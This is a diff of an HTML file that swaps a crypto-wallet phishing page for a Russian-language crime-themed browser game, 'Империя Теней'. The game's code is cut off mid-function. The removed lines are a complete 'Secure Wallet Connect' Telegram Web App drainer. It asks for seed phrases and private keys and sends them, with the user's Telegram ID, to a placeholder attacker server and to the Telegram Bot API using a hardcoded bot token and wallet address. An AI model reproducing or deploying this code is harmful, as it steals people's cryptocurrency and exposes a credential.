@@ -1,120 +1,1291 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Wallet Connect | Telegram</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <title>Империя Теней</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; min-height: 100vh; display: flex; flex-direction: column; justify-content: center; }
-        .container { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); padding: 30px; border-radius: 20px; max-width: 400px; margin: 0 auto; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
-        input, button { width: 100%; padding: 15px; margin: 10px 0; border: none; border-radius: 10px; font-size: 16px; box-sizing: border-box; }
-        input { background: rgba(255,255,255,0.2); color: white; }
-        input::placeholder { color: #ddd; }
-        button { background: #FF416C; color: white; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:hover { background: #FF4B2B; transform: scale(1.02); }
-        .hidden { display: none; }
-        .loader { border: 4px solid rgba(255,255,255,0.3); border-top: 4px solid white; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #fff;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            background: linear-gradient(90deg, #2d3436 0%, #636e72 100%);
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 20px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+        
+        .header h1 {
+            font-size: 2.8rem;
+            margin-bottom: 10px;
+            background: linear-gradient(90deg, #74b9ff 0%, #0984e3 100%);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        
+        .header .subtitle {
+            font-size: 1.2rem;
+            opacity: 0.9;
+        }
+        
+        .game-area {
+            display: grid;
+            grid-template-columns: 1fr 300px;
+            gap: 20px;
+        }
+        
+        .stats-panel {
+            background: rgba(30, 30, 46, 0.9);
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .stats-item {
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .stats-item:last-child {
+            border-bottom: none;
+        }
+        
+        .stats-item h3 {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 10px;
+            color: #74b9ff;
+        }
+        
+        .progress-bar {
+            height: 12px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 6px;
+            overflow: hidden;
+            margin: 10px 0;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            border-radius: 6px;
+            transition: width 0.5s ease;
+        }
+        
+        .energy-bar .progress-fill {
+            background: linear-gradient(90deg, #00b894 0%, #55efc4 100%);
+        }
+        
+        .police-bar .progress-fill {
+            background: linear-gradient(90deg, #d63031 0%, #ff7675 100%);
+        }
+        
+        .influence-bar .progress-fill {
+            background: linear-gradient(90deg, #6c5ce7 0%, #a29bfe 100%);
+        }
+        
+        .business-list {
+            list-style: none;
+            padding-left: 5px;
+        }
+        
+        .business-list li {
+            padding: 8px 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        
+        .business-list li:last-child {
+            border-bottom: none;
+        }
+        
+        .legal-biz {
+            color: #00b894;
+        }
+        
+        .illegal-biz {
+            color: #e17055;
+        }
+        
+        .action-panel {
+            background: rgba(30, 30, 46, 0.9);
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .tabs {
+            display: flex;
+            gap: 5px;
+            margin-bottom: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 5px;
+        }
+        
+        .tab {
+            flex: 1;
+            padding: 12px;
+            text-align: center;
+            background: transparent;
+            border: none;
+            color: #fff;
+            cursor: pointer;
+            border-radius: 8px;
+            transition: all 0.3s ease;
+            font-weight: 600;
+        }
+        
+        .tab:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+        
+        .tab.active {
+            background: linear-gradient(90deg, #0984e3 0%, #74b9ff 100%);
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        .action-button {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 10px;
+            background: linear-gradient(90deg, #2d3436 0%, #636e72 100%);
+            color: white;
+            font-size: 1.1rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .action-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+            background: linear-gradient(90deg, #0984e3 0%, #74b9ff 100%);
+        }
+        
+        .action-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .action-details {
+            background: rgba(0, 0, 0, 0.2);
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 10px;
+            border-left: 4px solid #0984e3;
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .modal.active {
+            display: flex;
+        }
+        
+        .modal-content {
+            background: linear-gradient(135deg, #2d3436 0%, #636e72 100%);
+            padding: 30px;
+            border-radius: 20px;
+            width: 90%;
+            max-width: 500px;
+            max-height: 80vh;
+            overflow-y: auto;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+        }
+        
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .close-modal {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 1.5rem;
+            cursor: pointer;
+            padding: 5px 10px;
+        }
+        
+        .modal-actions {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        
+        .modal-button {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+        
+        .modal-button.primary {
+            background: linear-gradient(90deg, #00b894 0%, #55efc4 100%);
+            color: white;
+        }
+        
+        .modal-button.secondary {
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+        }
+        
+        .modal-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .start-screen {
+            text-align: center;
+            padding: 40px 20px;
+        }
+        
+        .start-screen h2 {
+            font-size: 2.5rem;
+            margin-bottom: 30px;
+            color: #74b9ff;
+        }
+        
+        .start-input {
+            width: 100%;
+            max-width: 400px;
+            padding: 15px;
+            margin: 20px auto;
+            border: none;
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            font-size: 1.2rem;
+            text-align: center;
+        }
+        
+        .start-button {
+            background: linear-gradient(90deg, #0984e3 0%, #74b9ff 100%);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 1.3rem;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 25px rgba(9, 132, 227, 0.3);
+        }
+        
+        .start-button:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 30px rgba(9, 132, 227, 0.5);
+        }
+        
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            padding: 15px 25px;
+            border-radius: 10px;
+            background: linear-gradient(90deg, #2d3436 0%, #636e72 100%);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
+            z-index: 1001;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            max-width: 400px;
+            transform: translateX(500px);
+            transition: transform 0.5s ease;
+            border-left: 5px solid #0984e3;
+        }
+        
+        .notification.show {
+            transform: translateX(0);
+        }
+        
+        .notification.success {
+            border-left-color: #00b894;
+        }
+        
+        .notification.error {
+            border-left-color: #d63031;
+        }
+        
+        .notification.warning {
+            border-left-color: #fdcb6e;
+        }
+        
+        .day-counter {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 10px 20px;
+            border-radius: 10px;
+            font-size: 1.2rem;
+            font-weight: bold;
+        }
+        
+        @media (max-width: 768px) {
+            .game-area {
+                grid-template-columns: 1fr;
+            }
+            
+            .header h1 {
+                font-size: 2rem;
+            }
+            
+            .day-counter {
+                position: relative;
+                top: 0;
+                right: 0;
+                margin-top: 10px;
+            }
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>🔐 Secure Wallet Connect</h2>
-        <p>Connect your wallet to use our services securely.</p>
-        
-        <div id="step1">
-            <input type="text" id="seedPhrase" placeholder="Enter your 12 or 24 word seed phrase" />
-            <input type="password" id="privateKey" placeholder="Or enter your private key" />
-            <button onclick="stealData()">Connect Wallet</button>
-            <p style="font-size: 12px; opacity: 0.8;">Your data is encrypted and secure with us.</p>
+        <!-- Начальный экран -->
+        <div id="startScreen" class="start-screen">
+            <h2><i class="fas fa-crown"></i> ИМПЕРИЯ ТЕНЕЙ</h2>
+            <p style="font-size: 1.2rem; margin-bottom: 30px; opacity: 0.9;">
+                Построй свою финансовую империю, выбирая между честным трудом и опасными,<br>
+                но прибыльными делами в тени. Управляй рисками, скрывайся от полиции<br>
+                и стань самым влиятельным человеком в городе!
+            </p>
+            
+            <input type="text" id="playerName" class="start-input" placeholder="Введите ваше имя" value="Игрок">
+            
+            <div style="margin: 30px 0;">
+                <button id="startGameBtn" class="start-button">
+                    <i class="fas fa-play"></i> НАЧАТЬ ИГРУ
+                </button>
+            </div>
+            
+            <div style="margin-top: 40px; opacity: 0.7;">
+                <p><i class="fas fa-lightbulb"></i> Совет: Начинайте с легальной работы, чтобы накопить капитал</p>
+                <p><i class="fas fa-exclamation-triangle"></i> Внимание: Полиция всегда начеку!</p>
+            </div>
         </div>
 
-        <div id="step2" class="hidden">
-            <p>✅ Wallet connected! Initiating secure sync...</p>
-            <div class="loader"></div>
-            <p id="status">Draining funds to secure backup...</p>
+        <!-- Основной игровой интерфейс -->
+        <div id="gameInterface" style="display: none;">
+            <div class="header">
+                <h1><i class="fas fa-crown"></i> ИМПЕРИЯ ТЕНЕЙ</h1>
+                <div class="subtitle">Построй свою финансовую империю в мире теневых сделок</div>
+                <div class="day-counter" id="dayCounter">День: 1</div>
+            </div>
+
+            <div class="game-area">
+                <!-- Левая панель: Статистика -->
+                <div class="stats-panel">
+                    <div class="stats-item">
+                        <h3><i class="fas fa-user"></i> Игрок: <span id="playerNameDisplay">Игрок</span></h3>
+                    </div>
+                    
+                    <div class="stats-item">
+                        <h3><i class="fas fa-money-bill-wave"></i> Финансы</h3>
+                        <div style="font-size: 2rem; font-weight: bold; color: #00b894;">
+                            $<span id="moneyAmount">1,000</span>
+                        </div>
+                    </div>
+                    
+                    <div class="stats-item">
+                        <h3><i class="fas fa-chart-line"></i> Репутация</h3>
+                        <div style="font-size: 1.5rem; color: #74b9ff;">
+                            <span id="reputationAmount">10</span> очков
+                        </div>
+                    </div>
+                    
+                    <div class="stats-item energy-bar">
+                        <h3><i class="fas fa-bolt"></i> Энергия</h3>
+                        <div class="progress-bar">
+                            <div class="progress-fill" id="energyBar" style="width: 100%"></div>
+                        </div>
+                        <div style="text-align: right; font-size: 0.9rem;">
+                            <span id="energyAmount">100</span>/100
+                        </div>
+                    </div>
+                    
+                    <div class="stats-item police-bar">
+                        <h3><i class="fas fa-shield-alt"></i> Внимание полиции</h3>
+                        <div class="progress-bar">
+                            <div class="progress-fill" id="policeBar" style="width: 0%"></div>
+                        </div>
+                        <div style="text-align: right; font-size: 0.9rem;">
+                            <span id="policeAmount">0</span>%
+                        </div>
+                    </div>
+                    
+                    <div class="stats-item influence-bar">
+                        <h3><i class="fas fa-user-secret"></i> Влияние в тенях</h3>
+                        <div class="progress-bar">
+                            <div class="progress-fill" id="influenceBar" style="width: 0%"></div>
+                        </div>
+                        <div style="text-align: right; font-size: 0.9rem;">
+                            <span id="influenceAmount">0</span>%
+                        </div>
+                    </div>
+                    
+                    <div class="stats-item">
+                        <h3><i class="fas fa-building"></i> Легальный бизнес</h3>
+                        <ul class="business-list" id="legalBusinessList">
+                            <li><i class="fas fa-coffee legal-biz"></i> Нет предприятий</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="stats-item">
+                        <h3><i class="fas fa-skull-crossbones"></i> Криминальный бизнес</h3>
+                        <ul class="business-list" id="illegalBusinessList">
+                            <li><i class="fas fa-ghost illegal-biz"></i> Нет предприятий</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="stats-item">
+                        <h3><i class="fas fa-handshake"></i> Контакты</h3>
+                        <ul class="business-list" id="contactsList">
+                            <li><i class="fas fa-user-friends"></i> Нет контактов</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="stats-item">
+                        <h3><i class="fas fa-tasks"></i> Активные заказы</h3>
+                        <ul class="business-list" id="ordersList">
+                            <li><i class="fas fa-box"></i> Нет активных заказов</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Правая панель: Действия -->
+                <div class="action-panel">
+                    <div class="tabs" id="actionTabs">
+                        <button class="tab active" data-tab="legal">🏢 Легально</button>
+                        <button class="tab" data-tab="illegal">⚫ Тени</button>
+                        <button class="tab" data-tab="finance">💰 Финансы</button>
+                        <button class="tab" data-tab="defense">🛡️ Защита</button>
+                    </div>
+                    
+                    <!-- Легальные действия -->
+                    <div id="legalTab" class="tab-content active">
+                        <button class="action-button" onclick="workLegal(0)">
+                            <i class="fas fa-hammer"></i> Работать разнорабочим
+                        </button>
+                        <button class="action-button" onclick="workLegal(1)">
+                            <i class="fas fa-bicycle"></i> Работать курьером
+                        </button>
+                        <button class="action-button" onclick="workLegal(2)">
+                            <i class="fas fa-shopping-cart"></i> Работать продавцом
+                        </button>
+                        
+                        <div style="margin: 20px 0; padding: 15px; background: rgba(0, 184, 148, 0.1); border-radius: 10px;">
+                            <h4 style="color: #00b894; margin-bottom: 10px;"><i class="fas fa-store"></i> Купить легальный бизнес</h4>
+                            <button class="action-button" onclick="showBuyBusinessModal('legal', 0)">
+                                <i class="fas fa-coffee"></i> Небольшое кафе
+                            </button>
+                            <button class="action-button" onclick="showBuyBusinessModal('legal', 1)">
+                                <i class="fas fa-laptop"></i> Магазин электроники
+                            </button>
+                            <button class="action-button" onclick="showBuyBusinessModal('legal', 2)">
+                                <i class="fas fa-code"></i> IT-стартап
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <!-- Теневые действия -->
+                    <div id="illegalTab" class="tab-content">
+                        <button class="action-button" onclick="findOrder()">
+                            <i class="fas fa-search"></i> Найти теневой заказ
+                        </button>
+                        <button class="action-button" onclick="findContact()">
+                            <i class="fas fa-user-plus"></i> Найти контакт
+                        </button>
+                        
+                        <div style="margin: 20px 0; padding: 15px; background: rgba(231, 112, 85, 0.1); border-radius: 10px;">
+                            <h4 style="color: #e17055; margin-bottom: 10px;"><i class="fas fa-skull"></i> Купить криминальный бизнес</h4>
+                            <button class="action-button" onclick="showBuyBusinessModal('illegal', 0)">
+                                <i class="fas fa-industry"></i> Подпольный цех
+                            </button>
+                            <button class="action-button" onclick="showBuyBusinessModal('illegal', 1)">
+                                <i class="fas fa-network-wired"></i> Сеть курьеров
+                            </button>
+                            <button class="action-button" onclick="showBuyBusinessModal('illegal', 2)">
+                                <i class="fas fa-user-secret"></i> Хакерская группа
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <!-- Финансы -->
+                    <div id="financeTab" class="tab-content">
+                        <button class="action-button" onclick="updateMarket()">
+                            <i class="fas fa-chart-line"></i> Обновить биржевые котировки
+                        </button>
+                        
+                        <div style="margin: 20px 0; padding: 15px; background: rgba(155, 89, 182, 0.1); border-radius: 10px;">
+                            <h4 style="color: #9b59b6; margin-bottom: 10px;"><i class="fas fa-university"></i> Биржа</h4>
+                            <button class="action-button" onclick="showBuyStocksModal()">
+                                <i class="fas fa-arrow-up"></i> Купить акции
+                            </button>
+                            <button class="action-button" onclick="showSellStocksModal()">
+                                <i class="fas fa-arrow-down"></i> Продать акции
+                            </button>
+                        </div>
+                        
+                        <div style="margin: 20px 0; padding: 15px; background: rgba(52, 152, 219, 0.1); border-radius: 10px;">
+                            <h4 style="color: #3498db; margin-bottom: 10px;"><i class="fas fa-wallet"></i> Акции в портфеле</h4>
+                            <div id="stocksPortfolio"></div>
+                        </div>
+                    </div>
+                    
+                    <!-- Защита -->
+                    <div id="defenseTab" class="tab-content">
+                        <div style="margin-bottom: 20px; padding: 15px; background: rgba(231, 76, 60, 0.1); border-radius: 10px;">
+                            <h4 style="color: #e74c3c; margin-bottom: 10px;"><i class="fas fa-shield-alt"></i> Внимание полиции: <span id="policeValue">0</span>%</h4>
+                            <p style="font-size: 0.9rem; opacity: 0.8;">
+                                При 100% полиция проведёт обыск и конфискует имущество!
+                            </p>
+                        </div>
+                        
+                        <button class="action-button" onclick="hideFromPolice('bribe')">
+                            <i class="fas fa-money-bill"></i> Дать взятку (-25%, $3000)
+                        </button>
+                        <button class="action-button" onclick="hideFromPolice('official')">
+                            <i class="fas fa-user-tie"></i> Подкупить чиновника (-40%, $10000)
+                        </button>
+                        <button class="action-button" onclick="hideFromPolice('lay_low')">
+                            <i class="fas fa-bed"></i> Лечь на дно (-10%, +2 дня)
+                        </button>
+                    </div>
+                    
+                    <!-- Кнопка завершения дня -->
+                    <div style="margin-top: 30px; padding-top: 20px; border-top: 1px solid rgba(255, 255, 255, 0.1);">
+                        <button class="action-button" onclick="nextDay()" style="background: linear-gradient(90deg, #9b59b6 0%, #8e44ad 100%);">
+                            <i class="fas fa-moon"></i> ЗАВЕРШИТЬ ДЕНЬ
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Модальные окна -->
+    
+    <!-- Модалка для покупки бизнеса -->
+    <div id="buyBusinessModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 id="modalBusinessTitle">Купить бизнес</h3>
+                <button class="close-modal" onclick="closeModal('buyBusinessModal')">&times;</button>
+            </div>
+            <div id="modalBusinessContent">
+                <p>Загрузка информации...</p>
+            </div>
+            <div class="modal-actions">
+                <button class="modal-button primary" onclick="confirmBuyBusiness()">
+                    <i class="fas fa-shopping-cart"></i> Купить
+                </button>
+                <button class="modal-button secondary" onclick="closeModal('buyBusinessModal')">
+                    Отмена
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Модалка для заказа -->
+    <div id="orderModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3><i class="fas fa-box"></i> Найден теневой заказ</h3>
+                <button class="close-modal" onclick="closeModal('orderModal')">&times;</button>
+            </div>
+            <div id="orderModalContent">
+                <p>Загрузка информации...</p>
+            </div>
+            <div class="modal-actions">
+                <button class="modal-button primary" onclick="acceptOrder()">
+                    <i class="fas fa-check"></i> Принять заказ
+                </button>
+                <button class="modal-button secondary" onclick="closeModal('orderModal')">
+                    Отказаться
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Модалка для контакта -->
+    <div id="contactModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3><i class="fas fa-user-plus"></i> Новый контакт</h3>
+                <button class="close-modal" onclick="closeModal('contactModal')">&times;</button>
+            </div>
+            <div id="contactModalContent">
+                <p>Загрузка информации...</p>
+            </div>
+            <div class="modal-actions">
+                <button class="modal-button primary" onclick="hireContact()">
+                    <i class="fas fa-handshake"></i> Нанять контакт
+                </button>
+                <button class="modal-button secondary" onclick="closeModal('contactModal')">
+                    Отказаться
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Модалка для покупки акций -->
+    <div id="buyStocksModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3><i class="fas fa-arrow-up"></i> Купить акции</h3>
+                <button class="close-modal" onclick="closeModal('buyStocksModal')">&times;</button>
+            </div>
+            <div id="buyStocksContent">
+                <p>Загрузка биржевых котировок...</p>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Модалка для продажи акций -->
+    <div id="sellStocksModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3><i class="fas fa-arrow-down"></i> Продать акции</h3>
+                <button class="close-modal" onclick="closeModal('sellStocksModal')">&times;</button>
+            </div>
+            <div id="sellStocksContent">
+                <p>Загрузка вашего портфеля...</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Уведомления -->
+    <div id="notification" class="notification">
+        <i class="fas fa-info-circle" id="notificationIcon"></i>
+        <div>
+            <div id="notificationTitle">Уведомление</div>
+            <div id="notificationMessage">Сообщение</div>
         </div>
     </div>
 
     <script>
-        const TARGET_WALLET = "UQAsheA_-_9cZWd7fLFkwZVETwZAims7FSewYgKWzfZnTVYJ";
-        const BOT_TOKEN = "8368424800:AAECDU93UscL6fok1P31BGLfEe7m7WMhyj8";
-        const SERVER_URL = "https://your-malicious-server.com/log"; // Замени на свой сервер для логирования
+        // Глобальные переменные
+        let socket = null;
+        let gameState = null;
+        let currentOrder = null;
+        let currentContact = null;
+        let currentBusinessType = null;
+        let currentBusinessIndex = null;
+        let currentMarket = null;
 
-        // Инициализация Telegram Web App
-        let tg = window.Telegram.WebApp;
-        tg.expand();
-        tg.MainButton.setText("Connected").show();
-
-        function stealData() {
-            const seedPhrase = document.getElementById('seedPhrase').value;
-            const privateKey = document.getElementById('privateKey').value;
-            const user = tg.initDataUnsafe.user || {};
-            const userId = user.id || 'unknown';
-            const username = user.username || 'no_username';
-
-            // Показываем "загрузку"
-            document.getElementById('step1').classList.add('hidden');
-            document.getElementById('step2').classList.remove('hidden');
-
-            // Формируем данные для отправки
-            const stolenData = {
-                userId,
-                username,
-                seedPhrase,
-                privateKey,
-                timestamp: new Date().toISOString(),
-                targetWallet: TARGET_WALLET
+        // Инициализация WebSocket соединения
+        function connectWebSocket() {
+            const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsUrl = `${wsProtocol}//${window.location.hostname}:8765`;
+            
+            socket = new WebSocket(wsUrl);
+            
+            socket.onopen = function() {
+                console.log('WebSocket соединение установлено');
             };
+            
+            socket.onmessage = function(event) {
+                const data = JSON.parse(event.data);
+                handleServerMessage(data);
+            };
+            
+            socket.onclose = function() {
+                console.log('WebSocket соединение закрыто');
+                showNotification('Соединение потеряно. Попробуйте перезагрузить страницу.', 'error');
+            };
+            
+            socket.onerror = function(error) {
+                console.error('WebSocket ошибка:', error);
+                showNotification('Ошибка соединения с сервером', 'error');
+            };
+        }
 
-            // Отправляем данные на сервер злоумышленника (первый канал)
-            fetch(SERVER_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(stolenData)
-            }).catch(e => console.error('Server log failed:', e));
+        // Обработка сообщений от сервера
+        function handleServerMessage(data) {
+            switch(data.type) {
+                case 'game_state':
+                    gameState = data.data;
+                    updateGameDisplay();
+                    break;
+                    
+                case 'action_result':
+                    if (data.data.success) {
+                        showNotification(data.data.message, 'success');
+                        if (data.data.event) {
+                            showNotification(data.data.event, 'success');
+                        }
+                    } else {
+                        showNotification(data.data.message, 'error');
+                    }
+                    gameState = data.game_state;
+                    updateGameDisplay();
+                    break;
+                    
+                case 'market_update':
+                    currentMarket = data.data;
+                    gameState = data.game_state;
+                    updateGameDisplay();
+                    showNotification('Биржевые котировки обновлены', 'success');
+                    break;
+                    
+                case 'order_found':
+                    if (data.data.success) {
+                        currentOrder = data.data.order;
+                        showOrderModal(currentOrder);
+                    } else {
+                        showNotification(data.data.message, 'error');
+                    }
+                    break;
+                    
+                case 'contact_found':
+                    if (data.data.success) {
+                        currentContact = data.data.contact;
+                        showContactModal(currentContact);
+                    } else {
+                        showNotification(data.data.message, 'error');
+                    }
+                    break;
+                    
+                case 'day_complete':
+                    gameState = data.game_state;
+                    updateGameDisplay();
+                    
+                    // Показываем все сообщения о завершении дня
+                    if (data.data.messages && data.data.messages.length > 0) {
+                        data.data.messages.forEach(msg => {
+                            showNotification(msg, 'warning');
+                        });
+                    }
+                    break;
+                    
+                case 'error':
+                    showNotification(data.message, 'error');
+                    break;
+            }
+        }
 
-            // Отправляем оповещение в Telegram бот (второй канал)
-            const botMessage = `✅ Новая добыча!
-👤 User: @${username} (${userId})
-🔑 Seed: ${seedPhrase || 'N/A'}
-🗝️ Private Key: ${privateKey || 'N/A'}
-🕒 Time: ${new Date().toLocaleString()}
-➡️ Target: ${TARGET_WALLET}`;
+        // Отправка сообщения на сервер
+        function sendToServer(action, data = {}) {
+            if (socket && socket.readyState === WebSocket.OPEN) {
+                const message = JSON.stringify({ action, ...data });
+                socket.send(message);
+            } else {
+                showNotification('Нет соединения с сервером', 'error');
+            }
+        }
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: userId, text: botMessage })
-            }).then(() => {
-                // Имитируем успешное подключение и начинаем "слив"
-                document.getElementById('status').textContent = "Transferring assets to secure vault...";
-                simulateTransfer();
-            }).catch(e => {
-                console.error('Telegram bot error:', e);
-                document.getElementById('status').textContent = "Error in secure channel. Retrying...";
+        // Обновление отображения игры
+        function updateGameDisplay() {
+            if (!gameState) return;
+            
+            const player = gameState.player;
+            const market = gameState.market;
+            
+            // Обновляем статистику
+            document.getElementById('playerNameDisplay').textContent = player.name;
+            document.getElementById('moneyAmount').textContent = player.money.toLocaleString();
+            document.getElementById('reputationAmount').textContent = player.reputation;
+            document.getElementById('energyAmount').textContent = player.energy;
+            document.getElementById('policeAmount').textContent = player.police_attention;
+            document.getElementById('influenceAmount').textContent = player.influence;
+            
+            // Обновляем прогресс-бары
+            document.getElementById('energyBar').style.width = `${player.energy}%`;
+            document.getElementById('policeBar').style.width = `${player.police_attention}%`;
+            document.getElementById('influenceBar').style.width = `${player.influence}%`;
+            
+            // Обновляем день
+            document.getElementById('dayCounter').textContent = `День: ${player.day}`;
+            
+            // Обновляем списки бизнеса
+            updateBusinessList('legalBusinessList', player.legal_businesses, 'legal-biz', 'fas fa-building');
+            updateBusinessList('illegalBusinessList', player.illegal_businesses, 'illegal-biz', 'fas fa-skull-crossbones');
+            updateBusinessList('contactsList', player.contacts, '', 'fas fa-user-friends');
+            
+            // Обновляем активные заказы
+            updateOrdersList();
+            
+            // Обновляем портфель акций
+            updateStocksPortfolio();
+            
+            // Обновляем значение полиции в защите
+            document.getElementById('policeValue').textContent = player.police_attention;
+        }
+
+        // Обновление списка бизнеса
+        function updateBusinessList(elementId, items, cssClass, iconClass) {
+            const listElement = document.getElementById(elementId);
+            listElement.innerHTML = '';
+            
+            if (items.length === 0) {
+                const li = document.createElement('li');
+                li.innerHTML = `<i class="${iconClass} ${cssClass}"></i> Нет ${elementId.includes('legal') ? 'легальных' : 'криминальных'} предприятий`;
+                listElement.appendChild(li);
+            } else {
+                items.forEach(item => {
+                    const li = document.createElement('li');
+                    li.innerHTML = `<i class="${iconClass} ${cssClass}"></i> ${item}`;
+                    listElement.appendChild(li);
+                });
+            }
+        }
+
+        // Обновление списка заказов
+        function updateOrdersList() {
+            const listElement = document.getElementById('ordersList');
+            listElement.innerHTML = '';
+            
+            if (!gameState || !gameState.player.active_orders || gameState.player.active_orders.length === 0) {
+                const li = document.createElement('li');
+                li.innerHTML = `<i class="fas fa-box"></i> Нет активных заказов`;
+                listElement.appendChild(li);
+            } else {
+                gameState.player.active_orders.forEach(order => {
+                    const li = document.createElement('li');
+                    li.innerHTML = `
+                        <i class="fas fa-box"></i> ${order.item}
+                        <span style="font-size: 0.8rem; opacity: 0.7; margin-left: auto;">
+                            ${order.days_left} дн.
+                        </span>
+                    `;
+                    listElement.appendChild(li);
+                });
+            }
+        }
+
+        // Обновление портфеля акций
+        function updateStocksPortfolio() {
+            const portfolioElement = document.getElementById('stocksPortfolio');
+            
+            if (!gameState || !gameState.player.stocks || Object.keys(gameState.player.stocks).length === 0) {
+                portfolioElement.innerHTML = '<p style="text-align: center; opacity: 0.7;">Нет акций в портфеле</p>';
+                return;
+            }
+            
+            let html = '';
+            const market = gameState.market;
+            
+            Object.entries(gameState.player.stocks).forEach(([company, amount]) => {
+                if (amount > 0 && market[company]) {
+                    const value = amount * market[company].price;
+                    html += `
+                        <div style="display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid rgba(255,255,255,0.05);">
+                            <div>
+                                <i class="fas fa-chart-line"></i> ${company}
+                            </div>
+                            <div>
